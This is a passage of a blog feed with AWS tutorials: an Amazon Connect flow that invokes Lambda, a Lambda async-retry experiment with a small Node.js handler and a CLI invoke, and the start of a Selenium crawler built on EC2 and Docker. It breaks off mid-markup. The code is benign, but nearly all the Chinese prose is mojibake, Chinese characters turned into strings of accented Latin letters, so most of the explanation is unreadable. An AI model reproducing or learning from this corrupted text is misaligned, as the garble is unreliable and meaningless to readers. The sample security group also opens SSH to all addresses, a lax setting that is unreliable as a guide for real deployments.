å¯åœ¨åšå´çš„æœå°‹æ¬„ç•¶ä¸­æœå°‹ Lambda Invokeï¼Œæ¥è‘—æœƒå‡ºç¾ <strong>Invoke AWS Lambda function</strong> çš„åŠŸèƒ½æ–¹å¡Šï¼Œå°±æŠŠä»–æ‹‰åˆ°ä¸­é–“çš„ç•«å¸ƒä¸Šã€‚ä½ å¯ä»¥å…ˆé»é¸ Invoke AWS Lambda function å³ä¸Šè§’çš„é»é»ï¼Œä¸¦é¸æ“‡ <strong>edit setting</strong>ï¼Œæ¥è‘—å³å´æœƒè·³å‡ºç·¨è¼¯è¦–çª—ï¼Œè«‹è¼¸å…¥ä½ å‰›æ‰å»ºç«‹Lambda å‡½å¼çš„ ARNï¼Œæ¥è‘—æŒ‰ä¸‹ <strong>Save</strong>ã€‚</p><p><img src="https://i.imgur.com/9LBtvaI.jpg" alt="Imgur"></p><p>æ¥è‘—åœ¨å·¦å´æœå°‹æ¬„æœå°‹ <strong>Play Prompt</strong> ä¸¦æ‹‰åˆ°ä¸­é–“ç•«å¸ƒä¸Šï¼Œä¸€æ¨£é»æ“Šå³ä¸Šè§’é»é»ï¼ŒæŒ‰ä¸‹ <strong>edit setting</strong>ã€‚</p><p><img src="https://i.imgur.com/iskcGZZ.jpg" alt="Imgur"></p><p>é¸æ“‡ Text-to&#x3D;speech or chat text çš„é¸é …ï¼Œä¸¦åœ¨åº•ä¸‹è¼¸å…¥å®¢æˆ¶å‰›æ¥å…¥èŠå¤©å®¤æœƒå‡ºç¾çš„è¨Šæ¯ã€‚æˆ‘åœ¨é€™é‚Šè¼¸å…¥</p><p><code>Hi there,  this flow section will try to invoke Lambda function.</code></p><p>å®Œæˆå¾Œé»é¸ Saveã€‚</p><p>æ¥è‘—å¯ä»¥ä¸€æ¨£åœ¨å·¦å´çš„æœå°‹æ¬„ä½ç•¶ä¸­çš„ <strong>Terminate</strong> æ‰¾åˆ° <strong>Disconnect</strong> åŠŸèƒ½æ–¹å¡Šï¼Œä¸¦æŠŠä»–æ‹‰åˆ°ä¸­é–“ç•«å¸ƒä¸Šã€‚</p><p>æœ€å¾Œå°‡æ‰€æœ‰åŠŸèƒ½æ–¹å¡Šçš„ç®­é ­é€£æ¥ä¸Šï¼Œæ•´é«”æµç¨‹æœƒåƒæ˜¯ä¸‹é¢çš„åœ–ä¸€æ¨£ã€‚</p><p><img src="https://i.imgur.com/RPBKkRu.jpg" alt="Imgur"></p><p>ä¸ç®¡æˆåŠŸèˆ‡å¦éƒ½æœƒèª¿ç”¨ Lambda å‡½å¼ï¼Œä½†è§¸ç™¼æˆåŠŸæ‰æœƒå»è§¸ç™¼ Promptï¼Œè€Œå¤±æ•—å°±æ˜¯ç›´æ¥çµæŸé€£ç·šï¼Œè€ŒLambdaå‡½å¼èª¿ç”¨å¤±æ•—ä¹Ÿæœƒç›´æ¥çµæŸé€£ç·šã€‚ </p><p>æœ€å¾ŒæŒ‰ä¸‹ <strong>Save å®Œæˆå¾ŒæŒ‰ä¸‹ Publish</strong></p><blockquote><p>ä¸€å®šè¦ç¢ºä¿æŒ‰ä¸‹ Publishï¼Œè‹¥ä½ æ²’æœ‰ Publish ä½ æ‰€è¨­å®šçš„ Flow ä¸æœƒå‡ºç¾åœ¨å„€è¡¨æ¿ä¸Š</p></blockquote><h2 id="æ­¥é©Ÿäº”ã€æ¸¬è©¦-Chat"><a href="#æ­¥é©Ÿäº”ã€æ¸¬è©¦-Chat" class="headerlink" title="æ­¥é©Ÿäº”ã€æ¸¬è©¦ Chat"></a>æ­¥é©Ÿäº”ã€æ¸¬è©¦ Chat</h2><blockquote><p><strong>ä¸€æ—¦æ‰€æœ‰è¨­å®šå®Œæˆï¼Œæˆ‘å€‘å°‡é€²è¡Œæ¸¬è©¦ã€‚é€éæ¨¡æ“¬çš„èŠå¤©ç•Œé¢ï¼Œæˆ‘å€‘å°‡æª¢æŸ¥ Lambda å‡½å¼æ˜¯å¦è¢«æˆåŠŸè§¸ç™¼ï¼Œä»¥åŠé©—è­‰æ•´åˆçš„é‹ä½œæ˜¯å¦ç¬¦åˆé æœŸã€‚</strong></p></blockquote><p>æ¥è‘—ä¸€æ¨£é»é¸å·¦å´çš„ Panel æœ€ä¸Šé¢æœ‰é»åƒ Windows Logoçš„åœ–ç¤ºï¼Œé»é¸ <strong>Dashboardï¼Œå›åˆ°åŸå…ˆçš„ä¸»ç•«é¢ã€‚</strong></p><p><img src="https://i.imgur.com/IL3lPpV.jpg" alt="Imgur"></p><p>é»é¸ <strong>Test Chat</strong>ï¼Œä¹‹å¾Œæœƒè·³å‡º Test Chat é é¢ï¼Œé»é¸å·¦ä¸Šè§’çš„ <strong>Test Settings</strong></p><p><img src="https://i.imgur.com/0EFhRCk.jpg" alt="Imgur"></p><p>é»é¸å¾Œæœƒå‡ºç¾ä¸€å€‹è¨­å®šé¸å–®ï¼Œåœ¨ Contact Flow ä¸­è«‹é¸æ“‡ä½ å‰›æ‰å»ºç«‹çš„ Flowï¼Œæ¥è‘—æŒ‰ä¸‹ <strong>Apply</strong></p><p><img src="https://i.imgur.com/sN5qfW5.jpg" alt="Imgur"></p><p>ç•¶ä½ æŒ‰ä¸‹ Apply å¾Œå°±æœƒå‡ºç¾ä¸€å€‹ æ¨¡æ“¬çš„èŠå¤©ç•Œé¢ï¼Œä¸¦ä¸”é¡¯ç¤ºå®¢æˆ¶åŠ å…¥Chatçš„ç‹€æ³ï¼Œè€Œæˆ‘å€‘çš„è¨­å®šæ˜¯ä¸è«–å¦‚ä½•éƒ½æœƒé™çµæŸé€£ç·šã€‚æ‰€ä»¥æˆ‘å€‘å¯ä»¥å›åˆ°Lambda é é¢å»æª¢æŸ¥ Lambda å‡½å¼æœ‰æ²’æœ‰è¢«è§¸ç™¼ã€‚</p><p><img src="https://i.imgur.com/1LoXmPY.jpg" alt="Imgur"></p><h2 id="æ­¥é©Ÿå…­ã€æª¢æŸ¥æ—¥èªŒ"><a href="#æ­¥é©Ÿå…­ã€æª¢æŸ¥æ—¥èªŒ" class="headerlink" title="æ­¥é©Ÿå…­ã€æª¢æŸ¥æ—¥èªŒ"></a>æ­¥é©Ÿå…­ã€æª¢æŸ¥æ—¥èªŒ</h2><blockquote><p><strong>æœ€å¾Œï¼Œæˆ‘å€‘å°‡æª¢æŸ¥ Lambda å‡½å¼çš„æ—¥èªŒï¼Œä»¥ç¢ºèª Lambda æ˜¯å¦è¢«æ­£ç¢ºèª¿ç”¨ï¼Œä¸¦ç¢ºä¿æ•´åˆçš„å¯é æ€§ã€‚</strong></p></blockquote><p>å›åˆ° Lambda Console é»é¸ <strong>View CloudWatch logs</strong></p><p><img src="https://i.imgur.com/C5ziVSW.jpg" alt="Imgur"></p><p>é»é–‹æœ€æ–°ç”¢ç”Ÿçš„ Log Streamsï¼Œå¯ä»¥ç™¼ç¾ <code>Invoke Success!</code> çš„å­—ä¸²ï¼Œç”±æ­¤å¾—çŸ¥æˆ‘å€‘çš„ Lambda è¢«æˆåŠŸèª¿ç”¨äº†</p><p><img src="https://i.imgur.com/xzwSbUl.jpg" alt="Imgur"></p><h2 id="çµè«–"><a href="#çµè«–" class="headerlink" title="çµè«–"></a>çµè«–</h2><p>é€éé€™ç¯‡æ–‡ç« ï¼Œæ‚¨å°‡å­¸æœƒå¦‚ä½•ä½¿ç”¨ Amazon Connect å’Œ Lambda Function æ•´åˆå®¢æˆ¶æœå‹™çš„æµç¨‹ï¼Œä¸¦å¯¦ç¾è‡ªå®šç¾©çš„å®¢æˆ¶äº’å‹•ã€‚è®“æˆ‘å€‘ä¸€èµ·è¸å‡ºé€™å€‹æ•´åˆä¹‹æ—…å§ï¼</p>]]></content>
      
      
      <categories>
          
          <category> å¯¦ä½œç´€éŒ„ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> Lambda </tag>
            
            <tag> Connect </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>âš™ï¸åœ¨ Lambda ä¸Šè¨­å®šéŒ¯èª¤é‡è©¦ (Retry)</title>
      <link href="/posts/d400aff3.html"/>
      <url>/posts/d400aff3.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¸€æ¨£æ˜¯è§£ case ç¢°åˆ°çš„å•é¡Œï¼Œä½†æˆ‘ä¹Ÿæ²’çœŸçš„åœ¨ Lambda è¨­å®šéé‡è©¦ (Retry)ï¼Œé€™æ¬¡å°±ç§‰æŒè‘—å¯¦é©—ç²¾ç¥ä¾†åœ¨è‡ªå·±çš„ç’°å¢ƒå¯¦é©—çœ‹çœ‹ã€‚</p><p>Lambda ç•¶ä¸­çš„éŒ¯èª¤é‡è©¦é€šå¸¸æ˜¯ç”¨æ–¼ç•¶<strong>éåŒæ­¥èª¿ç”¨(Asynchronous Invocations)</strong> å¤±æ•—å¾Œé‡æ–°ç™¼é€èª¿ç”¨è«‹æ±‚çš„è¡Œç‚ºã€‚é‡å°éåŒæ­¥èª¿ç”¨ï¼ŒLambda æœƒå°‡äº‹ä»¶ç½®æ”¾åœ¨ Queue ç•¶ä¸­ï¼Œä¸¦å‚³å›æˆåŠŸå›æ‡‰ï¼Œå…¶ä¸­ä¸åŒ…å«å…¶ä»–è³‡è¨Šã€‚å–®ç¨çš„ç¨‹åºæœƒå¾ Queue è®€å–äº‹ä»¶ï¼Œä¸¦å°‡äº‹ä»¶å‚³é€åˆ°æ‚¨çš„å‡½æ•¸</p><p><img src="https://i.imgur.com/wn1vCQu.png" alt="Imgur"></p><blockquote><p>åœ–ç‰‡ç”¨ ZenUML å»ºç«‹çš„<br><a href="https://app.zenuml.com/">https://app.zenuml.com/</a><br><a href="https://mermaid.js.org/syntax/zenuml.html">https://mermaid.js.org/syntax/zenuml.html</a></p></blockquote><h2 id="å»ºç«‹-Lambda"><a href="#å»ºç«‹-Lambda" class="headerlink" title="å»ºç«‹ Lambda"></a>å»ºç«‹ Lambda</h2><p>é€™é‚Šå»ºç«‹ Lambdaéƒ¨åˆ†å¾ˆç°¡å–®ï¼Œå°±å»ºç«‹ä¸€å€‹åå« <strong>TestInvocations</strong> çš„ functionï¼Œä½¿ç”¨çš„ Runtime æ˜¯ <code>NodeJS.14.x</code></p><h2 id="ä¿®æ”¹-Lambda-Handler-ç¨‹å¼"><a href="#ä¿®æ”¹-Lambda-Handler-ç¨‹å¼" class="headerlink" title="ä¿®æ”¹ Lambda Handler ç¨‹å¼"></a>ä¿®æ”¹ Lambda Handler ç¨‹å¼</h2><p>åœ¨ Lambda Consoleä¸»é åº•ä¸‹çš„ <strong>Code</strong> å€åŸŸä¾†ä¿®æ”¹ç¨‹å¼ï¼Œæ›´æ”¹ <code>index.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> outside = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">exports</span>.<span class="property">handler</span> = <span class="function">(<span class="params">event, context, callback</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">        <span class="string">&#x27;RequestId&#x27;</span>: context.<span class="property">awsRequestId</span>,</span><br><span class="line">        <span class="string">&#x27;outside&#x27;</span>: outside++</span><br><span class="line">    &#125;)); </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">callback</span>(<span class="string">&#x27;Error&#x27;</span>, <span class="string">&#x27;retry test&#x27;</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä¸€ä½†ä¿®æ”¹å®Œç•¢å¾Œï¼Œå¯ä»¥é»é¸ <strong>deploy</strong> ï¼Œä¾†ä¸Šå‚³ä¿®æ”¹å¥½çš„ç¨‹å¼</p><p><img src="https://i.imgur.com/3XJYyyo.jpg" alt="Imgur"></p><h2 id="è¨­å®šé‡è©¦"><a href="#è¨­å®šé‡è©¦" class="headerlink" title="è¨­å®šé‡è©¦"></a>è¨­å®šé‡è©¦</h2><p>æˆ‘å€‘å¯ä»¥å» Lambda Console çš„ä¸»é å» <strong>Configuration</strong> é é¢é¸æ“‡ <strong>Asynchronous Invocation</strong> ï¼Œæ¥è‘—å» Edit</p><p><img src="https://i.imgur.com/uVM6U6E.jpg" alt="Imgur"></p><p><strong>Retry attempts</strong> æœ€å¤šèƒ½å¤ è¨­åˆ° <code>2</code>ï¼Œåœ¨ä½ çš„ Lambda Function æ¥æ”¶éåŒæ­¥å«ç”¨å¾Œç™¼ç”ŸéŒ¯èª¤ï¼Œä¸¦é‡è©¦å…©æ¬¡å¾Œï¼Œè©² Event å°±æœƒè¢«æ‹‹æ£„ï¼Œä½†ä¹Ÿå¯ä»¥é¡å¤–è¨­å®š <strong>Dead Letter Queue (DLQ)</strong> ä¾†å»å­˜æ”¾ä¾†è¢«æ¨æ£„çš„äº‹ä»¶ï¼Œä»¥ä¾›å¾ŒçºŒè™•ç†ã€‚</p><blockquote><p>ç´°ç¯€å¯ä»¥åƒè€ƒé€™ä»½å®˜æ–¹æ–‡ä»¶: <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-async.html#invocation-dlq">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-async.html#invocation-dlq</a></p></blockquote><h2 id="è§¸ç™¼Lambda"><a href="#è§¸ç™¼Lambda" class="headerlink" title="è§¸ç™¼Lambda"></a>è§¸ç™¼Lambda</h2><p>æ¥è‘—å¯ä»¥é€é <strong>AWS CLI (Command Line Tool)</strong> ä¾†å»èª¿ç”¨ Lambda å‡½å¼</p><blockquote><p>æ²’æœ‰è¨­å®šé AWS CLI çš„å¯ä»¥åƒè€ƒé€™ä»½æ–‡ä»¶ä¾†é€²è¡Œè¨­ç½® &gt;&gt; <a href="https://aws.amazon.com/cli/">https://aws.amazon.com/cli/</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws lambda invoke --function-name TestInvocations --invocation-type Event test.txt</span><br></pre></td></tr></table></figure><p>é€™é‚Šè¨­å®š <code>--invocation-type</code> ç‚º Eventï¼Œé€™éº¼ä»£è¡¨ä½ æ˜¯ä»¥éåŒæ­¥çš„æ–¹å¼ä¾†èª¿ç”¨ Lambdaã€‚</p><p>æ¥è‘—æœƒå›å‚³ç‹€æ…‹ç¢¼ <code>202</code>   é€™æ˜¯ä»£è¡¨ï¼Œä½ çš„è«‹æ±‚å·²è¢« Lambda æ¥å—ï¼Œä½†é‚„ä¸æœƒé¦¬ä¸Šè™•ç† ï¼ˆç•¢ç«Ÿæ˜¯éåŒæ­¥ï¼‰</p><blockquote><p>åƒè€ƒè³‡æ–™:<br><a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/API_Invoke.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/API_Invoke.html</a></p></blockquote><div class="note info flat"><p>å°æ–¼ Lambda åŒæ­¥ä»¥åŠéåŒæ­¥èª¿ç”¨ï¼Œå¯ä»¥å€‹åˆ¥åƒè€ƒå°æ‡‰çš„å®˜æ–¹æ–‡ä»¶èªªæ˜<br><a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-async.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-async.html</a><br><a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-sync.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-sync.html</a><br>è‡³æ–¼åœ¨æ¶æ§‹ä¸Šçš„ç•°åŒï¼Œä»¥å¾Œå¯ä»¥å†å¯«ä¸€ç¯‡æ–‡ç« ä¾†æ•´ç†ï¼</p></div><h2 id="è§€æ¸¬çµæœ"><a href="#è§€æ¸¬çµæœ" class="headerlink" title="è§€æ¸¬çµæœ"></a>è§€æ¸¬çµæœ</h2><p>ä¹‹å¾Œæˆ‘å€‘å¯ä»¥åˆ° Lambda Console ä¸Šé¢çš„ <strong>Monitor</strong> é é¢ï¼Œé»é¸ View <strong>CloudWatch logs</strong> é¸é …ï¼Œé€™æ™‚å€™å°±æœƒè·³å‡º Cloudwatch Logs çš„ä¸»é </p><p><img src="https://i.imgur.com/aOskbVm.jpg" alt="Imgur"><br><img src="https://i.imgur.com/EKlsnSl.jpg" alt="Imgur"></p><p>ç•¶ä½ æ¯æ¬¡å»ºç«‹ Lambda æ™‚ï¼Œé è¨­æœƒçµ¦äºˆLambda çš„åŸ·è¡Œè§’è‰²ä¸€å€‹åå« <code>AWSBasicExecutionRole</code> çš„æ”¿ç­–ï¼Œå…¶ä¸­åŒ…å«äº†å»ºç«‹Cloudwatch Log Group é‚„æœ‰ Cloudwatch Log çš„æ¬Šé™ï¼Œä¸¦ä¸”æœƒå»ºç«‹ <code>/aws/lambda/&lt;ä½ çš„Lambdåç¨±&gt;</code> çš„é€™éº¼ä¸€å€‹<strong>æ—¥èªŒçµ„ï¼ˆLog Groupï¼‰</strong>ï¼Œåœ¨é€™å€‹æ—¥èªŒçµ„åº•ä¸‹æœƒæœ‰è¨±å¤š<strong>æ—¥èªŒæµï¼ˆLog Streamï¼‰</strong>ï¼Œæ¯ç•¶ä½ <br>å°ä½ çš„Lambdaå‡½å¼é€²è¡Œè®Šæ›´ä¸¦é‡æ–°è§¸ç™¼Functionï¼Œå°±æœƒç”¢ç”Ÿæ–°çš„æ—¥èªŒæµ</p><p><img src="https://i.imgur.com/JSuUpCk.jpg" alt="Imgur"></p><p>æ­¤æ™‚æˆ‘å€‘é¸æ“‡æœ€æ–°çš„æ—¥èªŒæµï¼Œå¯ä»¥ç™¼ç¾æœ‰ä¸‰ç­† invocationï¼Œç¬¬ä¸€ç­†ç‚ºæˆ‘å€‘è§¸ç™¼çš„ï¼Œç¬¬äºŒä»¥åŠç¬¬ä¸‰å‰‡æ˜¯æˆ‘å€‘è¨­å®šçš„é‡è©¦è§¸ç™¼</p><p>è§¸ç™¼è«‹æ±‚-1<br><img src="https://i.imgur.com/OMHbzV7.jpg" alt="Imgur"><br>Retry-1<br><img src="https://i.imgur.com/gmvSuMn.jpg" alt="Imgur"><br>Retry-2<br><img src="https://i.imgur.com/mbniv78.jpg" alt="Imgur"></p><p>é€™è£¡å°±å¯ä»¥è§€å¯Ÿåˆ°ï¼Œinvocationå¾Œçš„æ—¥èªŒå¯ä»¥çœ‹åˆ°éŒ¯èª¤è¨Šæ¯ï¼Œä¸¦ä¸”åœ¨ç¬¬ä¸€æ¬¡è«‹æ±‚éŒ¯èª¤å¾Œéä¸€åˆ†é˜æœƒé‡è©¦ä¸€æ¬¡ï¼Œåœ¨ç¬¬ä¸€æ¬¡é‡è©¦å¤±æ•—å¾Œéå…©åˆ†é˜æœƒå»é‡è©¦ç¬¬äºŒæ¬¡ï¼Œæ¥è‘—å°±ä¸æœƒå†å»é‡è©¦äº†ã€‚é€™é‚Šä¹Ÿè§€å¯Ÿåˆ°éŒ¯èª¤é‡è©¦æ™‚çš„ request id è·ŸåŸæœ¬çš„ä¸€æ¨£ï¼Œæ‡‰è©²å¯ä»¥è©¦è‘—ç”¨é€™å€‹ç•¶åˆ¤æ–·æ˜¯å¦ç‚ºéŒ¯èª¤é‡è©¦ã€äº‹ä»¶æ˜¯å¦å·²ç¶“è™•ç†éã€‚</p><h2 id="çµè«–"><a href="#çµè«–" class="headerlink" title="çµè«–"></a>çµè«–</h2><p>åœ¨ é–‹ç™¼ Lambda ç¨‹å¼ä»¥åŠé€²è¡Œç›¸é—œè¨­å®šæ™‚ï¼Œå‹™å¿…è¦æ³¨æ„ èª¿ç”¨çš„é¡å‹ä»¥åŠå°æ‡‰çš„è¨­å®šæœ‰å“ªäº›ï¼Œæ‰ä¸æœƒå‚»å‚»çš„æ··ç”¨è€Œä¸è‡ªçŸ¥ã€‚</p><h2 id="åƒè€ƒè³‡æ–™"><a href="#åƒè€ƒè³‡æ–™" class="headerlink" title="åƒè€ƒè³‡æ–™"></a>åƒè€ƒè³‡æ–™</h2><p><a href="https://azole.medium.com/aws-lambda-reuse-and-retry-behavior-ffaac616d869">https://azole.medium.com/aws-lambda-reuse-and-retry-behavior-ffaac616d869</a><br><a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-retries.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-retries.html</a></p>]]></content>
      
      
      <categories>
          
          <category> å¯¦ä½œç´€éŒ„ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Amazon </tag>
            
            <tag> Lambda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ğŸé€é Amazon Lambda å¯¦è¸ Web Crawler</title>
      <link href="/posts/6dbe323f.html"/>
      <url>/posts/6dbe323f.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>é€™ç¯‡æ–‡ç« æ˜¯åœ¨é‡ç¾å®¢æˆ¶å•é¡Œæ™‚å€™çš„çš„å¯¦è¸ï¼ŒåŸå…ˆç‚ºäº†è§£æ±ºå®¢æˆ¶çš„å•é¡Œï¼Œæˆ‘è©¦è‘—æƒ³è¦å®‰è£ <strong>Selenium Chromedriver</strong> ä»¥åŠ <strong>BeautifulSoup</strong> ï¼Œæ‰“åŒ…æˆ Lambda Layer ä¸¦å»ºç«‹åŸºæ–¼è©²Layerçš„Lambdaï¼Œä½†ä¸€ç›´å‡ºç¾ Chromedriver æ‰¾ä¸åˆ°æª”æ¡ˆçš„éŒ¯èª¤ï¼Œå·¦è¸©å‘åˆè¸©å‘çš„troubleshooting çªç„¶é€™ç¯‡æ•‘æ˜Ÿ <a href="https://stackoverflow.com/questions/69047401/selenium-docker-container-runs-on-ec2-but-not-on-aws-lambda">https://stackoverflow.com/questions/69047401/selenium-docker-container-runs-on-ec2-but-not-on-aws-lambda</a> ï¼Œæ ¹æ“šé€™ç¯‡æ–‡ç« ä»¥åŠç›¸å°æ‡‰çš„ github <a href="https://github.com/rchauhan9/image-scraper-lambda-container/tree/master%EF%BC%8C%E4%B8%8A%E9%9D%A2%E4%B8%BB%E8%A6%81%E6%98%AF%E4%BB%A5">https://github.com/rchauhan9/image-scraper-lambda-container/tree/masterï¼Œä¸Šé¢ä¸»è¦æ˜¯ä»¥</a> Container Image çš„æ–¹å¼ä¾†å»ºç«‹ Lambda ï¼Œä½†è¦é€™éº¼åšä¹‹å‰æœƒå…ˆå°‡éœ€è¦çš„å¥—ä»¶è·Ÿç’°å¢ƒæ‰“åŒ…æˆ Imageã€‚</p><p>ä½†ç”±æ–¼å…¬å¸çš„ Mac ä¸èƒ½å®‰è£ Dockerï¼Œå› æ­¤æˆ‘å…ˆé–‹å€‹ EC2 ä¾†é€²è¡Œå¤§éƒ¨åˆ†æ“ä½œ</p><div class="note alert flat"><p>æœ¬ç¯‡æ–‡ç« çš„ç¯„ä¾‹ä»¥åŠå»ºæ§‹æ‰€éœ€çŸ¥è­˜çš†åƒè€ƒè‡ªAWSå®˜æ–¹æ–‡ä»¶</p></div><p>æ‰€æœ‰æµç¨‹å¤§æ¦‚å¦‚ä¸‹</p><div class="note info flat"><p>é€™é‚Šé€é mermaid ç¹ªè£½æµç¨‹åœ–æ˜¯åƒè€ƒé€™ç¯‡éƒ¨è½æ ¼ä»¥åŠå®˜æ–¹æ–‡æª”çš„æ•™å­¸<br><a href="https://shannonhung.github.io/posts/first-blog.html#%E5%89%8D%E8%A8%80">https://shannonhung.github.io/posts/first-blog.html#%E5%89%8D%E8%A8%80</a><br><a href="https://mermaid.js.org/syntax/flowchart.html">https://mermaid.js.org/syntax/flowchart.html</a></p></div><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph LR   A(å»ºç«‹åŠè¨­å®šEC2) --&gt; B(è¨­å®šVPC)    B(è¨­å®šVPC) --&gt; C(é€£æ¥EC2)   C(é€£æ¥EC2) --&gt; D(å®‰è£Docker)   D(å®‰è£Docker) --&gt; E(å»ºæ§‹é¡åƒ)   E(å»ºæ§‹é¡åƒ) --&gt;  F(æ¸¬è©¦å®¹å™¨)   F(æ¸¬è©¦å®¹å™¨) --&gt; G(æ¨ä¸Šå„²å­˜åº«)   G(æ¨ä¸Šå„²å­˜åº«) --&gt; H(å»ºæ§‹Lambda)  </pre></div><h2 id="å®‰è£-EC2"><a href="#å®‰è£-EC2" class="headerlink" title="å®‰è£ EC2"></a>å®‰è£ EC2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Name: TestWebScrapping</span><br><span class="line">AMI: Amazon Linux 2</span><br><span class="line">Region: us-east-1</span><br><span class="line">Access Key: &quot;CWAccess.pem&quot;</span><br></pre></td></tr></table></figure><h2 id="è¨­å®šç¶²è·¯"><a href="#è¨­å®šç¶²è·¯" class="headerlink" title="è¨­å®šç¶²è·¯"></a>è¨­å®šç¶²è·¯</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">IPv4 CIDR: 10.1.0.0/16</span><br><span class="line"></span><br><span class="line">Subnet: TestSubnet1</span><br><span class="line">CIDR: 10.1.0.0/24</span><br><span class="line">RouteTable: </span><br><span class="line">10.1.0.0/16   |  local</span><br><span class="line">0.0.0.0/0     |  Internet Gateway</span><br><span class="line"></span><br><span class="line">Security Group</span><br><span class="line">TCP 443 Source: 0.0.0.0/0</span><br><span class="line">TCP 80 Source: 0.0.0.0/0</span><br><span class="line">TCP 22 Source: 0.0.0.0/0</span><br></pre></td></tr></table></figure><h2 id="å‰µå»ºå®Œç•¢å¾Œé€£æ¥åˆ°-EC2"><a href="#å‰µå»ºå®Œç•¢å¾Œé€£æ¥åˆ°-EC2" class="headerlink" title="å‰µå»ºå®Œç•¢å¾Œé€£æ¥åˆ° EC2"></a>å‰µå»ºå®Œç•¢å¾Œé€£æ¥åˆ° EC2</h2><p><img src="https://i.imgur.com/ZQwGuqY.jpg" alt="Imgur"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i &quot;CWAccess.pem&quot; ec2-user@ec2-3-83-139-226.compute-1.amazonaws.com</span><br></pre></td></tr></table></figure><h2 id="å®‰è£-Docker"><a href="#å®‰è£-Docker" class="headerlink" title="å®‰è£ Docker"></a>å®‰è£ Docker</h2><p>é€™é‚Šçš„å®‰è£æ–‡ä»¶å¯ä»¥åƒè€ƒawsçš„å®˜æ–¹æŒ‡å¼•<br><a href="https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/create-container-image.html">https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/create-container-image.html</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo yum update -y</span><br><span class="line">sudo amazon-linux-extras install docker</span><br><span class="line">sudo service docker start</span><br><span class="line">sudo usermod -a -G docker ec2-user</span><br><span class="line"></span><br><span class="line">æ­¤æ™‚é‡æ–°ç™»å…¥Terminal</span><br><span class="line">docker info</span><br></pre></td></tr></table></figure><h2 id="å»ºæ§‹-Docker-Image"><a href="#å»ºæ§‹-Docker-Image" class="headerlink" title="å»ºæ§‹ Docker Image"></a>å»ºæ§‹ Docker Image</h2><p>åœ¨å®¶ç›®éŒ„ä¸­å…ˆæ–°å¢å¹¾é …æª”æ¡ˆï¼š</p><ul><li>requirements.txt</li><li>entry.sh</li><li>app&#x2F;app.y</li></ul><p>requirements.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">requests==2.25.0</span><br><span class="line">selenium==3.14.0</span><br><span class="line">beautifulsoup4==4.9.3</span><br><span class="line">Pillow==8.0.1</span><br><span class="line">boto3</span><br><span class="line">botocore</span><br></pre></td></tr></table></figure><p>entry.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$&#123;AWS_LAMBDA_RUNTIME_API&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">exec</span> /usr/bin/aws-lambda-rie /usr/local/bin/python -m awslambdaric <span class="variable">$1</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">exec</span> /usr/local/bin/python -m awslambdaric <span class="variable">$1</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>çµ¦äºˆåŸ·è¡Œæ¬Šé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 